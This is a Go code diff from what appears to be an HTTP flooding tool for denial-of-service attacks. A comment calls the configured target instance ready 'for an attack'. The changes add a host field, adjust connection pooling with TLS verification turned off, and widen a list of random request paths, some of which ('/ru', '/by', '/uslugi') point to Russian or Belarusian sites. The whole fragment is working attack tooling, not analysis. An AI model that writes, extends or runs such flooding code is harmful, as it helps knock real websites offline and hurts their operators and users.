@@ -25,6 +25,7 @@ var (
 type Target struct {
 	sync.RWMutex
 	address         string
+	host            string
 	resolvedAddress []string
 	port            int
 	randomize       bool
@@ -44,14 +45,14 @@ type Target struct {
 }
 
 // Statistics returns total number of requests and errors.
-func Statistics() (int64, int64) {
+func Statistics() (errors int64, requests int64) {
 	return atomic.LoadInt64(&totalErrors), atomic.LoadInt64(&totalRequests)
 }
 
 // Creates a target instance with all the configurations needed for an attack.
 func New(addr, proxy string) *Target {
 	tr := &http.Transport{
-		MaxIdleConns:       10000,
+		MaxIdleConns:       1000,
 		IdleConnTimeout:    30 * time.Second,
 		DisableCompression: true,
 		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
@@ -68,6 +69,8 @@ func New(addr, proxy string) *Target {
 		ReadTimeout: time.Second,
 	}
 
+	url, _ := url.Parse(addr)
+
 	ret := &Target{
 		address:       strings.TrimRight(strings.Trim(addr, " \r\n\t"), "/"),
 		port:          80,
@@ -75,6 +78,7 @@ func New(addr, proxy string) *Target {
 		httpTransport: tr,
 		httpClient:    client,
 		dnsClient:     dnsClient,
+		host:          url.Hostname(),
 	}
 
 	ret.SetProxy(proxy)
@@ -177,7 +181,7 @@ func (t *Target) generate() string {
 		proto = ""
 	}
 
-	urls := []string{"/info", "/admin", "/ru", "/by", "/en", "/user", "/api", "/auth", "/prod", "/uslugi", "/blog", "/about"}
+	urls := []string{"/info", "/admin", "/ru", "/by", "/en", "/user", "/api", "/auth", "/prod", "/uslugi", "/blog", "/about", "/cgi/", "/index.html", "/robots.txt", ""}
 	url := urls[rand.Intn(len(urls))]
 	if strings.HasSuffix(t.address, "/") {
 		url = ""
